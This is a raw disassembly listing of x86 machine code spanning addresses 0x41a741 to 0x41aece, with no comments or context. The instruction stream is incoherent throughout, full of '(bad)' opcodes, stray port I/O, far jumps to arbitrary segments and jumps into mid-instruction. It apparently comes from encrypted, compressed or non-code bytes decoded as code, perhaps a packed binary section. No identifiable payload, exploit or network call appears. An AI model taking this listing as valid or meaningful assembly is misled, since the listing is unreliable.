  41a741:	fidivr WORD PTR [edi-0x231ef18d]
  41a747:	sub    BYTE PTR [ebx+0x1e],dh
  41a74a:	add    BYTE PTR [eax],al
  41a74c:	sub    BYTE PTR [edi+0x22],0x73
  41a750:	inc    esp
  41a751:	bound  eax,QWORD PTR [ecx]
  41a753:	push   ebx
  41a754:	std    
  41a755:	ja     0x41a799
  41a757:	adc    al,BYTE PTR [eax+0x62]
  41a75a:	push   esp
  41a75b:	lahf   
  41a75c:	pop    ecx
  41a75d:	mov    cl,0x3e
  41a75f:	add    BYTE PTR [esi-0x15],ah
  41a762:	xor    al,0x2
  41a764:	call   0xfd2e5ce6
  41a769:	fidiv  DWORD PTR [esp+eax*1]
  41a76c:	mul    BYTE PTR [edi-0x1e]
  41a76f:	jno    0x41a7b5
  41a771:	bound  eax,QWORD PTR [ecx]
  41a773:	jno    0x41a7a3
  41a775:	mov    bh,0x23
  41a777:	adc    cl,BYTE PTR [eax+esi*2-0x3e]
  41a77b:	add    al,0xf6
  41a77d:	addr16 loop 0x41a7f1
  41a780:	inc    esp
  41a781:	bound  eax,QWORD PTR [ecx]
  41a783:	jno    0x41a79a
  41a785:	cli    
  41a786:	out    dx,al
  41a787:	mov    ebx,0xc476e5fc
  41a78c:	jae    0x41a78e
  41a78e:	ins    BYTE PTR es:[edi],dx
  41a78f:	jg     0x41a7b2
  41a791:	and    al,0x4f
  41a793:	mov    dh,0x4
  41a795:	add    dl,ah
  41a797:	cmc    
  41a798:	pop    ds
  41a799:	jae    0x41a7b9
  41a79b:	add    al,BYTE PTR ds:0x402dbd53
  41a7a1:	adc    ah,BYTE PTR [edx]
  41a7a3:	add    ah,BYTE PTR [edx-0x61]
  41a7a6:	or     al,0xf
  41a7a8:	cmp    al,0x0
  41a7aa:	cmp    al,0x79
  41a7ac:	add    ecx,DWORD PTR ds:[edx-0x6946f027]
  41a7b3:	or     al,0x71
  41a7b5:	inc    edx
  41a7b6:	addr16 or al,0xfd
  41a7b9:	or     edx,DWORD PTR [ebp-0x67]
  41a7bc:	jmp    0xeed58d22
  41a7c1:	dec    ecx
  41a7c2:	sbb    DWORD PTR [eax],ebx
  41a7c4:	xchg   ebp,eax
  41a7c5:	jle    0x41a840
  41a7c7:	pop    eax
  41a7c8:	dec    esi
  41a7c9:	in     al,dx
  41a7ca:	in     al,0xfc
  41a7cc:	push   ecx
  41a7cd:	push   es
  41a7ce:	(bad)  
  41a7cf:	fnstenv [esi+0x70a4ac50]
  41a7d5:	cmp    BYTE PTR [esi+0x4a1112c1],al
  41a7db:	jmp    0x9526ab89
  41a7e0:	int    0x27
  41a7e2:	loope  0x41a7fc
  41a7e4:	jne    0x41a7e8
  41a7e6:	jae    0x41a801
  41a7e8:	add    DWORD PTR [eax],eax
  41a7ea:	pusha  
  41a7eb:	fldl2t 
  41a7ed:	pop    ebp
  41a7ee:	pusha  
  41a7ef:	lods   al,BYTE PTR ds:[esi]
  41a7f0:	push   ecx
  41a7f1:	into   
  41a7f2:	add    BYTE PTR [esp+ecx*1],dl
  41a7f5:	jmp    0x873c:0x1d0c5a5d
  41a7fc:	xchg   ebp,eax
  41a7fd:	jmp    0xdf7217e
  41a802:	jmp    0x41a854
  41a804:	or     eax,0x606243da
  41a809:	mov    edx,0x9084ef80
  41a80e:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41a810:	pop    ebp
  41a811:	outs   dx,BYTE PTR ds:[esi]
  41a812:	pop    ds
  41a813:	cli    
  41a814:	fsubr  st,st(1)
  41a816:	add    esi,DWORD PTR [edx]
  41a818:	stos   BYTE PTR es:[edi],al
  41a819:	cmp    BYTE PTR [esi+edi*2+0x79],bl
  41a81d:	jmp    0xec54d525
  41a822:	add    al,0xdd
  41a824:	pushf  
  41a825:	lds    esi,FWORD PTR [ebx]
  41a827:	scas   eax,DWORD PTR es:[edi]
  41a828:	in     eax,0x0
  41a82a:	or     eax,0x6400994d
  41a82f:	mov    eax,ds:0x15740e86
  41a834:	mov    eax,0xd961e998
  41a839:	push   eax
  41a83a:	push   esi
  41a83b:	jb     0x41a886
  41a83d:	adc    BYTE PTR [ecx+0xd455461],ch
  41a843:	push   0xffffff81
  41a845:	dec    esp
  41a846:	pop    esi
  41a847:	and    ecx,ebx
  41a849:	lea    ebp,[ebp+0x2e50b345]
  41a84f:	jb     0x41a8aa
  41a851:	pop    gs
  41a853:	popa   
  41a854:	pop    esi
  41a855:	push   ebp
  41a856:	lds    eax,FWORD PTR [eax]
  41a858:	mov    cl,0x42
  41a85a:	enter  0x61e9,0xd9
  41a85e:	call   0xfc4dfc0d
  41a863:	push   0xffffff95
  41a865:	mov    ch,0x38
  41a867:	jmp    0xadcfb4e3
  41a86c:	inc    ebp
  41a86d:	test   eax,0xbd7da5c2
  41a872:	add    DWORD PTR [esi+0xa30b5a2],ebp
  41a878:	data16 fld DWORD PTR [eax]
  41a87b:	pusha  
  41a87c:	mov    ds:0x8a6134b5,al
  41a881:	mov    ch,0x13
  41a883:	cli    
  41a884:	or     al,0xca
  41a886:	shr    BYTE PTR [ecx],0x6f
  41a889:	pop    ds
  41a88a:	ror    cl,1
  41a88c:	gs xchg esi,eax
  41a88e:	and    al,0xed
  41a890:	ficom  DWORD PTR [esi+0x3e]
  41a893:	call   0x25c181f9
  41a898:	xor    cl,0xe
  41a89b:	out    0x13,al
  41a89d:	push   ss
  41a89e:	add    BYTE PTR [edi+0x194c8],cl
  41a8a4:	gs push esp
  41a8a6:	mov    esp,0x62c03341
  41a8ab:	mov    DWORD PTR [edi-0x47],esi
  41a8ae:	and    BYTE PTR [ebp+0x5020b947],cl
  41a8b4:	inc    ebp
  41a8b5:	cdq    
  41a8b6:	and    al,0x1a
  41a8b8:	jnp    0x41a8bb
  41a8ba:	pmuludq mm0,QWORD PTR [eax]
  41a8bd:	mov    edx,DWORD PTR [esi+0x7ac34800]
  41a8c3:	es dec eax
  41a8c5:	mov    bh,0xe0
  41a8c7:	dec    eax
  41a8c8:	je     0x41a861
  41a8ca:	into   
  41a8cb:	je     0x41a8d7
  41a8cd:	ret    
  41a8ce:	jnp    0x41a8f1
  41a8d0:	mov    BYTE PTR [edi],0xea
  41a8d3:	adc    al,BYTE PTR ds:0x44c2e470
  41a8d9:	daa    
  41a8da:	call   0x188893e3
  41a8df:	inc    eax
  41a8e0:	and    al,0x35
  41a8e2:	aad    0xe9
  41a8e4:	push   cs
  41a8e5:	test   DWORD PTR [ecx+0x46391624],ebx
  41a8eb:	sti    
  41a8ec:	jmp    0xd735:0x24401834
  41a8f3:	sar    BYTE PTR cs:[ecx+0x1c],0x80
  41a8f8:	sar    ah,0x89
  41a8fb:	mov    esp,0x68d5fb00
  41a900:	add    eax,0x8d00d60a
  41a905:	xchg   edx,ebp
  41a907:	pushf  
  41a908:	add    bl,bh
  41a90a:	aad    0x50
  41a90c:	push   0xfffffffb
  41a90e:	stos   DWORD PTR es:[edi],eax
  41a90f:	add    BYTE PTR [edx-0x35],ch
  41a912:	stos   DWORD PTR es:[edi],eax
  41a913:	add    BYTE PTR [edx-0x35],ch
  41a916:	cmp    BYTE PTR [edi],0x24
  41a919:	scas   eax,DWORD PTR es:[edi]
  41a91a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a91b:	std    
  41a91c:	adc    eax,0x400f2c62
  41a921:	add    BYTE PTR [edx+0x75],ah
  41a924:	mov    edi,0xc04f4073
  41a929:	(bad)  gs:[ebx+0x1b]
  41a92d:	mov    al,ds:0x8b000060
  41a932:	out    0x13,al
  41a934:	mov    bh,bh
  41a936:	xchg   ebp,eax
  41a937:	dec    DWORD PTR [edi-0x3]
  41a93a:	ja     0x41a97c
  41a93c:	or     al,0x40
  41a93e:	bound  edi,QWORD PTR [edi+0x5b]
  41a941:	and    al,0x3a
  41a943:	add    BYTE PTR [esi],dh
  41a945:	std    
  41a946:	out    0x43,eax
  41a948:	sbb    al,0x2c
  41a94a:	jp     0x41a9ae
  41a94c:	sar    esp,0x65
  41a94f:	jl     0x41a910
  41a951:	jae    0x41a8e3
  41a953:	bound  esi,QWORD PTR [ebx-0x7d]
  41a956:	jle    0x41a9b6
  41a958:	add    BYTE PTR [eax],al
  41a95a:	bound  eax,QWORD PTR [edx-0x17]
  41a95d:	adc    bh,BYTE PTR [esi+0x1]
  41a960:	inc    eax
  41a961:	add    bh,ah
  41a963:	mov    dl,0x6a
  41a965:	sbb    esi,ebx
  41a967:	fild   QWORD PTR [ebx+0x13]
  41a96a:	loop   0x41a973
  41a96c:	add    dh,BYTE PTR [esi+edx*2+0x7c]
  41a970:	shr    BYTE PTR [ebx],0x60
  41a973:	ss add eax,0x15636875
  41a979:	jmp    0xe9770ce2
  41a97e:	pusha  
  41a97f:	arpl   WORD PTR ds:0xc61c25fe,sp
  41a985:	mov    DWORD PTR [eax],eax
  41a987:	jbe    0x41a95f
  41a989:	or     ecx,DWORD PTR [ebx+0x5044dea6]
  41a98f:	xlat   BYTE PTR ds:[ebx]
  41a990:	mov    dh,0x20
  41a992:	dec    esp
  41a993:	xor    bl,BYTE PTR [esp+eax*1-0x3226e175]
  41a99a:	pop    ss
  41a99b:	xor    cl,BYTE PTR [eax]
  41a99d:	cmc    
  41a99e:	xor    edx,DWORD PTR [ebp-0x67]
  41a9a1:	jmp    0xedcfa726
  41a9a6:	jp     0x41a9c9
  41a9a8:	mov    ebp,0xdb267d31
  41a9ad:	outs   dx,BYTE PTR ds:[esi]
  41a9ae:	inc    eax
  41a9af:	jle    0x41a946
  41a9b1:	pusha  
  41a9b2:	aas    
  41a9b3:	fs push esp
  41a9b5:	and    BYTE PTR es:[edx],ah
  41a9b8:	push   edx
  41a9b9:	stos   DWORD PTR es:[edi],eax
  41a9ba:	stc    
  41a9bb:	ficomp DWORD PTR [ebp-0x5f22bffb]
  41a9c1:	jecxz  0x41a9bc
  41a9c3:	sbb    DWORD PTR [ebp-0x25e9840d],edi
  41a9c9:	add    BYTE PTR [eax+0x46],bl
  41a9cc:	in     eax,0xb4
  41a9ce:	std    
  41a9cf:	in     eax,0x13
  41a9d1:	push   0x7c
  41a9d3:	mov    esi,0x7e685eda
  41a9d8:	loope  0x41a9fd
  41a9da:	mov    edi,0x1f9e51a0
  41a9df:	outs   dx,DWORD PTR ds:[esi]
  41a9e0:	pop    ecx
  41a9e1:	adc    ecx,DWORD PTR [edx]
  41a9e3:	outs   dx,DWORD PTR ds:[esi]
  41a9e4:	pop    ebx
  41a9e5:	dec    eax
  41a9e6:	out    0x36,al
  41a9e8:	or     BYTE PTR [edi+0x40],ch
  41a9eb:	add    BYTE PTR [esi+0x7e386cb1],al
  41a9f1:	mov    ch,0x60
  41a9f3:	sub    al,0xa
  41a9f5:	push   0x24
  41a9f7:	out    0x16,eax
  41a9f9:	push   esp
  41a9fa:	lods   al,BYTE PTR ds:[esi]
  41a9fb:	inc    esi
  41a9fc:	lods   al,BYTE PTR ds:[esi]
  41a9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9fe:	ds jnp 0x41aa01
  41aa01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa03:	push   eax
  41aa04:	jmp    0x41a9fa
  41aa06:	data16 fucomip st,st(5)
  41aa09:	pop    ebx
  41aa0a:	(bad)  
  41aa0b:	inc    ebx
  41aa0c:	xchg   ebx,eax
  41aa0d:	scas   al,BYTE PTR es:[edi]
  41aa0e:	adc    ecx,DWORD PTR [edi-0x23]
  41aa11:	xchg   esp,eax
  41aa12:	add    BYTE PTR ds:0x5c40736e,cl
  41aa18:	lea    edi,[ebp+0xf649128]
  41aa1e:	add    ch,cl
  41aa20:	dec    eax
  41aa21:	mov    WORD PTR [ecx+eax*8],fs
  41aa24:	loopne 0x41aa43
  41aa26:	or     DWORD PTR [edi],esi
  41aa28:	xchg   esi,eax
  41aa29:	sub    ebx,esi
  41aa2b:	call   0xc59efc91
  41aa30:	inc    ebp
  41aa31:	pop    ebp
  41aa32:	shl    esi,0x1d
  41aa35:	out    dx,al
  41aa36:	(bad)  
  41aa37:	call   0xd86fc9d
  41aa3c:	outs   dx,BYTE PTR ds:[esi]
  41aa3d:	pusha  
  41aa3e:	jne    0x41aa45
  41aa40:	data16 fidivr DWORD PTR [edi-0x122021a]
  41aa47:	call   0x750274ad
  41aa4c:	add    eax,0x921dbd
  41aa51:	pop    es
  41aa52:	xor    ah,BYTE PTR [edi+0x1cbd9d2f]
  41aa58:	call   0xe8c62e96
  41aa5d:	popa   
  41aa5e:	push   eax
  41aa5f:	jmp    0x6da1c33e
  41aa64:	int    0x6d
  41aa66:	pop    edx
  41aa67:	out    dx,al
  41aa68:	fidiv  WORD PTR [ebp+0x61e901b8]
  41aa6e:	jae    0x41aa6e
  41aa70:	jno    0x41aaa4
  41aa72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa73:	jg     0x41aaec
  41aa75:	mov    eax,ds:0xfc650be1
  41aa7a:	push   es
  41aa7b:	cld    
  41aa7c:	jmp    0x6a822f61
  41aa81:	pop    esi
  41aa82:	fld    DWORD PTR [eax]
  41aa84:	out    0x7d,al
  41aa86:	or     BYTE PTR [ecx],al
  41aa88:	jmp    0xbd02ee
  41aa8d:	aas    
  41aa8e:	fimul  DWORD PTR ds:0xde1385
  41aa94:	add    BYTE PTR [ebx+0x4ffc342],ah
  41aa9a:	mov    dl,0x4
  41aa9c:	jb     0x41aa70
  41aa9e:	cmc    
  41aa9f:	inc    ebp
  41aaa0:	cmp    BYTE PTR [ebx],bh
  41aaa2:	fiadd  DWORD PTR [eax]
  41aaa4:	add    al,ah
  41aaa6:	add    eax,0x77bf5e33
  41aaab:	add    edi,DWORD PTR [ecx]
  41aaad:	test   ebp,eax
  41aaaf:	or     eax,0xddf384
  41aab4:	add    BYTE PTR [eax],al
  41aab6:	fcomp  DWORD PTR [edx]
  41aab8:	push   0x6
  41aaba:	pop    ebp
  41aabb:	cmp    BYTE PTR [edi],0x24
  41aabe:	inc    ebx
  41aabf:	xchg   edx,eax
  41aac0:	xchg   DWORD PTR [edi+ebx*2-0x49],edi
  41aac4:	icebp  
  41aac5:	stos   DWORD PTR es:[edi],eax
  41aac6:	loope  0x41aa48
  41aac8:	jge    0x41aada
  41aaca:	and    BYTE PTR [edx-0x7888b077],dl
  41aad0:	ret    0xb474
  41aad3:	pop    ecx
  41aad4:	jge    0x41aae6
  41aad6:	cmp    esi,DWORD PTR [edi+0x17]
  41aad9:	push   dx
  41aadb:	jecxz  0x41ab4c
  41aadd:	sbb    cl,dl
  41aadf:	cdq    
  41aae0:	and    al,0x39
  41aae2:	gs cdq 
  41aae4:	and    al,0x39
  41aae6:	iret   
  41aae7:	sbb    eax,0x9a96386f
  41aaec:	add    al,0x6a
  41aaee:	aas    
  41aaef:	stos   BYTE PTR es:[edi],al
  41aaf0:	xchg   DWORD PTR [edi+ebx*1-0x67],eax
  41aaf4:	jmp    0x10be331b
  41aaf9:	sbb    al,0x8e
  41aafb:	in     al,0x62
  41aafd:	add    DWORD PTR [edx-0x2c],0x6f
  41ab01:	and    BYTE PTR [ecx+0x623a24c6],dl
  41ab07:	cs cmp al,0x24
  41ab0a:	cmp    BYTE PTR [edi+edi*4+0x72],bh
  41ab0e:	push   esi
  41ab0f:	lea    edi,[esi]
  41ab11:	or     BYTE PTR [eax+0x20],bh
  41ab14:	push   eax
  41ab15:	mov    esp,DWORD PTR [esi]
  41ab17:	aam    0x3d
  41ab19:	push   eax
  41ab1a:	add    ch,dl
  41ab1c:	sub    al,0x44
  41ab1e:	push   ss
  41ab1f:	and    dh,al
  41ab21:	add    bl,0x56
  41ab24:	mov    esp,DWORD PTR [eax+ecx*1-0x19]
  41ab28:	outs   dx,BYTE PTR ds:[esi]
  41ab29:	imul   esp,DWORD PTR [ecx-0x2bb2a1d],0x62
  41ab30:	lock jmp DWORD PTR [ebp-0x27]
  41ab34:	mov    ebp,0xb3eb662c
  41ab39:	and    BYTE PTR [esp+ecx*1],dh
  41ab3c:	(bad)  
  41ab3d:	ja     0x41ab9a
  41ab3f:	inc    esi
  41ab40:	out    0xd9,al
  41ab42:	add    al,0xd8
  41ab44:	cmp    eax,0xd4268840
  41ab49:	sub    bh,BYTE PTR [ebp-0x698b]
  41ab4f:	sub    ebx,DWORD PTR [esi]
  41ab51:	and    al,0x76
  41ab53:	pop    ebp
  41ab54:	push   ds
  41ab55:	ja     0x41abd2
  41ab57:	xchg   BYTE PTR [ebx],al
  41ab59:	fld    DWORD PTR [esi]
  41ab5b:	mov    esp,0xc43c3d77
  41ab60:	mov    DWORD PTR [ebx],edi
  41ab62:	and    al,0x8d
  41ab64:	push   0x16a68b09
  41ab69:	sub    BYTE PTR [eax+0x35],dl
  41ab6c:	outs   dx,DWORD PTR ds:[esi]
  41ab6d:	sbb    al,0x30
  41ab6f:	fisttp WORD PTR [esi+0x1c]
  41ab72:	xor    BYTE PTR [edx],bh
  41ab74:	adc    ch,bl
  41ab76:	(bad)  
  41ab77:	sbb    eax,0x5e73bf76
  41ab7c:	hlt    
  41ab7d:	cmp    ah,BYTE PTR [eax+eax*1]
  41ab80:	inc    ebx
  41ab81:	fldcw  WORD PTR [esi+0x5a]
  41ab84:	pop    edx
  41ab85:	pop    esi
  41ab86:	aam    0x13
  41ab88:	loope  0x41ab7f
  41ab8a:	shl    ebx,cl
  41ab8c:	not    BYTE PTR [eax+0x1e]
  41ab8f:	sub    BYTE PTR [esi-0xf],dl
  41ab92:	jp     0x41abe8
  41ab94:	in     eax,0x4
  41ab96:	jns    0x41ab9d
  41ab98:	retf   0x6777
  41ab9b:	add    eax,0x89ba5062
  41aba0:	xlat   BYTE PTR ds:[ebx]
  41aba1:	(bad)  
  41aba2:	loop   0x41ab32
  41aba4:	mov    edx,0x7061fbc2
  41aba9:	push   esi
  41abaa:	adc    al,0x8
  41abac:	jecxz  0x41ab32
  41abae:	in     eax,0xf3
  41abb0:	xor    BYTE PTR [edx+0x19e10b6e],bh
  41abb6:	idiv   dh
  41abb8:	or     ebx,ebp
  41abba:	les    sp,DWORD PTR [ecx-0x57]
  41abbe:	push   0x58
  41abc0:	inc    esi
  41abc1:	leave  
  41abc2:	je     0x41ac14
  41abc4:	ds leave 
  41abc6:	push   ecx
  41abc7:	mov    ah,0x71
  41abc9:	fucompp 
  41abcb:	mov    BYTE PTR [ebp+0x21e1e58d],dh
  41abd1:	mov    ebp,0x1ce34907
  41abd6:	repnz push ds
  41abd8:	mov    WORD PTR [ebp-0xed870e8],es
  41abde:	mov    esi,0x90044d53
  41abe3:	add    eax,0x324faa00
  41abe8:	in     al,dx
  41abe9:	push   edx
  41abea:	push   edi
  41abeb:	jmp    0x654a96f3
  41abf0:	fidiv  DWORD PTR [ecx+0x6cef6ec4]
  41abf6:	jecxz  0x41ac73
  41abf8:	adc    eax,0xed0082e9
  41abfd:	fadd   QWORD PTR [esp+eax*1-0x781b5533]
  41ac04:	out    dx,al
  41ac05:	fiadd  DWORD PTR [ebx+0x75]
  41ac08:	add    cl,BYTE PTR [ecx+ebp*8-0x56965681]
  41ac0f:	sti    
  41ac10:	push   ebp
  41ac11:	cmp    cl,cl
  41ac13:	lea    esi,ds:0x68e8c93a
  41ac19:	mov    ch,0x2
  41ac1b:	cld    
  41ac1c:	ins    BYTE PTR es:[edi],dx
  41ac1d:	mov    eax,ds:0x25af0487
  41ac22:	mov    ebp,0x1cdd2c1f
  41ac27:	or     edx,esp
  41ac29:	jae    0x41abb0
  41ac2b:	shl    DWORD PTR [edx-0x6d],1
  41ac2e:	sti    
  41ac2f:	sbb    al,0x19
  41ac31:	fldenv [bp-0xf]
  41ac35:	rcl    BYTE PTR [edi-0x55ae36dc],cl
  41ac3b:	lea    esp,ds:0xd89c94a
  41ac41:	cmp    bh,BYTE PTR [eax+ebp*8-0x3fd5244]
  41ac48:	jb     0x41ac4a
  41ac4a:	sub    eax,0x1d6218bd
  41ac4f:	mov    ebp,0xbd156228
  41ac54:	and    al,0x70
  41ac56:	pop    esi
  41ac57:	repnz (bad) 
  41ac59:	stc    
  41ac5a:	cmp    edx,DWORD PTR [edx-0x38]
  41ac5d:	inc    ecx
  41ac5e:	push   ebx
  41ac5f:	jbe    0x41ac62
  41ac61:	jmp    0xc79dc942
  41ac66:	mov    ds:0xa20487a0,al
  41ac6b:	sbb    BYTE PTR [esi+0x62],dl
  41ac6e:	inc    ebp
  41ac6f:	pop    edx
  41ac70:	in     eax,dx
  41ac71:	xchg   ebp,eax
  41ac72:	je     0x41ac1f
  41ac74:	push   ebx
  41ac75:	add    cl,dl
  41ac77:	push   es
  41ac78:	mov    ecx,edi
  41ac7a:	icebp  
  41ac7b:	(bad)  
  41ac7c:	push   ebp
  41ac7d:	push   DWORD PTR [esi]
  41ac7f:	jnp    0x41ac93
  41ac81:	inc    eax
  41ac82:	sti    
  41ac83:	pop    ebx
  41ac84:	ror    BYTE PTR [esi+ecx*4],0x9a
  41ac88:	test   al,0x50
  41ac8a:	(bad)
  41ac8d:	mov    BYTE PTR [esi+0x35],0x3c
  41ac91:	add    bl,bh
  41ac93:	(bad)  
  41ac94:	std    
  41ac95:	adc    eax,0x3c0653
  41ac9a:	inc    esi
  41ac9b:	sbb    eax,0x92402370
  41aca0:	mov    al,0x8b
  41aca2:	xchg   BYTE PTR [ecx+0xd],ah
  41aca5:	lods   al,BYTE PTR ds:[esi]
  41aca6:	cli    
  41aca7:	add    DWORD PTR [ebx-0x43a44818],edi
  41acad:	jne    0x41acaf
  41acaf:	rcr    DWORD PTR [ebp-0xd],0xff
  41acb3:	push   esp
  41acb4:	fiadd  DWORD PTR [ebx-0x10bd8bb]
  41acba:	xor    dl,dl
  41acbc:	mov    dh,0x47
  41acbe:	hlt    
  41acbf:	add    ch,BYTE PTR [eax+0x15468cfb]
  41acc5:	dec    esp
  41acc6:	inc    DWORD PTR [esi-0x74bfee46]
  41accc:	push   ebp
  41accd:	aas    
  41acce:	fcomp  QWORD PTR [eax+0x4b]
  41acd1:	or     eax,0xfde243b7
  41acd6:	(bad)  
  41acd7:	jnp    0x41acaf
  41acd9:	or     eax,0x836f9147
  41acde:	dec    edi
  41acdf:	inc    esi
  41ace0:	push   ebx
  41ace1:	dec    edi
  41ace2:	nop
  41ace3:	shr    BYTE PTR [ecx],cl
  41ace5:	cld    
  41ace6:	(bad)  
  41ace7:	cmp    ebp,esi
  41ace9:	(bad)  
  41acea:	adc    DWORD PTR [eax+edi*8-0x7a],ebx
  41acee:	push   ebp
  41acef:	(bad)  
  41acf0:	loopne 0x41ac89
  41acf2:	retf   0xf062
  41acf5:	jmp    edi
  41acf7:	and    ah,BYTE PTR [ecx]
  41acf9:	loope  0x41acf7
  41acfb:	out    dx,eax
  41acfc:	cmp    al,0xd0
  41acfe:	mov    ch,BYTE PTR [edi+0x62e834a0]
  41ad04:	inc    esp
  41ad05:	loope  0x41ad03
  41ad07:	ftst   
  41ad09:	xor    al,0x14
  41ad0b:	mov    ds:0xeb506df0,al
  41ad10:	mov    dl,0x9
  41ad12:	std    
  41ad13:	add    BYTE PTR [eax+edi*2],dl
  41ad16:	dec    eax
  41ad17:	or     DWORD PTR [eax-0x36],edi
  41ad1a:	loope  0x41acf1
  41ad1c:	jmp    0xd58f1b58
  41ad21:	popa   
  41ad22:	mov    ecx,DWORD PTR [eax-0x33]
  41ad25:	test   edx,ebx
  41ad27:	cld    
  41ad28:	(bad)  
  41ad29:	lock sbb al,0xca
  41ad2c:	xor    eax,0xb5478af3
  41ad31:	es into 
  41ad33:	je     0x41ad8f
  41ad35:	fiadd  DWORD PTR [edi-0x782da9a4]
  41ad3b:	inc    esp
  41ad3c:	ins    BYTE PTR es:[edi],dx
  41ad3d:	jecxz  0x41ad7d
  41ad3f:	pop    ecx
  41ad40:	stos   DWORD PTR es:[edi],eax
  41ad41:	xor    ecx,DWORD PTR cs:[ecx-0x81c9182]
  41ad48:	jecxz  0x41acf5
  41ad4a:	ud0    edi,DWORD PTR [ebp-0x11]
  41ad4e:	xor    al,0x31
  41ad50:	cdq    
  41ad51:	inc    esp
  41ad52:	cmp    al,BYTE PTR [edi+0x5568dc1e]
  41ad58:	xlat   BYTE PTR ds:[ebx]
  41ad59:	dec    ebx
  41ad5a:	and    al,0x54
  41ad5c:	jmp    0x7e9d3424
  41ad61:	add    al,BYTE PTR [edi-0x78f979a5]
  41ad67:	pop    ebx
  41ad68:	jle    0x41ad43
  41ad6a:	loope  0x41acf6
  41ad6c:	cdq    
  41ad6d:	mov    ch,0xdd
  41ad6f:	mov    bl,BYTE PTR [ecx-0x7675564b]
  41ad75:	mov    ch,0xa5
  41ad77:	mov    al,BYTE PTR [eax]
  41ad79:	mov    DWORD PTR [ebp-0x4a46754f],esi
  41ad7f:	lods   eax,DWORD PTR ds:[esi]
  41ad80:	mov    bh,BYTE PTR [ecx-0x7c14664b]
  41ad86:	ja     0x41ad71
  41ad88:	add    ebx,ecx
  41ad8a:	gs push cs
  41ad8c:	mov    ch,bh
  41ad8e:	add    dl,ch
  41ad90:	pushf  
  41ad91:	daa    
  41ad92:	fucompp 
  41ad94:	add    esp,DWORD PTR [edi]
  41ad96:	xchg   esi,eax
  41ad97:	add    eax,0x2a367238
  41ad9c:	add    al,0xe5
  41ad9e:	popf   
  41ad9f:	add    eax,0xd9ddd40
  41ada4:	fs mov edx,0xc6ded8e5
  41adaa:	dec    esi
  41adab:	jle    0x41add5
  41adad:	push   cs
  41adae:	fucompp 
  41adb0:	add    ebp,ebp
  41adb2:	adc    dl,ch
  41adb4:	add    esp,DWORD PTR [edx-0xf]
  41adb7:	out    0xf4,al
  41adb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adba:	add    BYTE PTR [ebp-0x78],dh
  41adbd:	inc    ecx
  41adbe:	sub    eax,0xa96203ea
  41adc3:	fs push eax
  41adc5:	inc    esi
  41adc6:	mov    eax,ds:0xda120e81
  41adcb:	jmp    0x66425652
  41add0:	(bad)  
  41add1:	lock loope 0x41ae38
  41add4:	mov    BYTE PTR [ecx+0x55],al
  41add7:	jmp    0x50:0x74a96203
  41adde:	xchg   BYTE PTR [ecx-0x253929af],ah
  41ade4:	add    cl,ch
  41ade6:	in     eax,0x3f
  41ade8:	or     al,0x65
  41adea:	addr16 add ah,bh
  41aded:	jmp    0x896621da
  41adf2:	rcr    BYTE PTR [ebx-0x642126dc],cl
  41adf8:	and    al,0xed
  41adfa:	rcr    BYTE PTR [ebx-0x64113adc],cl
  41ae00:	and    al,0xc9
  41ae02:	repnz fwait
  41ae04:	and    al,0xa1
  41ae06:	ficomp WORD PTR [ebx-0x640d3adc]
  41ae0c:	and    al,0x5
  41ae0e:	out    dx,eax
  41ae0f:	fwait
  41ae10:	and    al,0x1
  41ae12:	aam    0xf3
  41ae14:	fwait
  41ae15:	sub    DWORD PTR [esi+0x16],esp
  41ae18:	inc    ebp
  41ae19:	add    eax,0xe900da32
  41ae1e:	popa   
  41ae1f:	ja     0x41ada8
  41ae21:	out    dx,eax
  41ae22:	repnz imul esp,DWORD PTR ds:0xd96191,0xffffffc1
  41ae2a:	push   ebx
  41ae2b:	sar    bl,1
  41ae2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae2e:	jmp    0xa571:0x49f475f2
  41ae35:	sub    DWORD PTR [esi-0x2],esp
  41ae38:	adc    eax,0xbfb139
  41ae3d:	jb     0x41adc8
  41ae3f:	pop    edx
  41ae40:	out    dx,al
  41ae41:	out    dx,al
  41ae42:	add    ch,bl
  41ae44:	sbb    al,BYTE PTR [ecx]
  41ae46:	jmp    0xc5c702ac
  41ae4b:	leave  
  41ae4c:	(bad)  
  41ae4d:	sti    
  41ae4e:	jmp    0x59f0684
  41ae53:	jbe    0x41ae51
  41ae55:	adc    eax,0xbf70b9
  41ae5a:	bound  ecx,QWORD PTR [ecx+0x1f00fc5a]
  41ae60:	mov    esp,0x995f4489
  41ae65:	xchg   DWORD PTR [edi+ebx*2+0x1],edx
  41ae69:	mov    DWORD PTR [eax],ecx
  41ae6b:	jmp    0xfc72153b
  41ae70:	rcl    DWORD PTR [eax-0x1],0xfa
  41ae74:	retf   0x4c89
  41ae77:	pop    ds
  41ae78:	pop    es
  41ae79:	xor    edx,edx
  41ae7b:	mov    esi,0x51450d1a
  41ae80:	dec    ebp
  41ae81:	dec    eax
  41ae82:	and    al,0x2f
  41ae84:	enter  0x15fd,0xc7
  41ae88:	or     edi,DWORD PTR [eax+eax*1]
  41ae8b:	sbb    BYTE PTR [esi+0x1c8e1424],0x70
  41ae92:	jnp    0x41af04
  41ae94:	aam    0x87
  41ae96:	dec    esp
  41ae97:	pop    edi
  41ae98:	mov    DWORD PTR [ebx-0x73],ecx
  41ae9b:	inc    edi
  41ae9c:	mov    cl,0x2c
  41ae9e:	push   ecx
  41ae9f:	xor    edx,ebx
  41aea1:	push   0xd55c10
  41aea6:	push   edi
  41aea7:	add    BYTE PTR [esi+eax*8],dl
  41aeaa:	adc    BYTE PTR [ebp-0x7ca95905],al
  41aeb0:	xchg   DWORD PTR [ecx-0x37b1fe94],esi
  41aeb6:	mov    DWORD PTR [edi+ebx*4-0x4e],eax
  41aeba:	push   ecx
  41aebb:	mov    eax,ebx
  41aebd:	leave  
  41aebe:	xchg   DWORD PTR [edi+ebp*4-0x5e],edx
  41aec2:	dec    esi
  41aec3:	push   ebx
  41aec4:	jae    0x41af07
  41aec6:	popf   
  41aec7:	inc    eax
  41aec8:	jnp    0x41ae94
  41aeca:	std    
  41aecb:	push   ecx
  41aecc:	stos   DWORD PTR es:[edi],eax
  41aecd:	push   edi
  41aece:	mov    esp,0x81775575
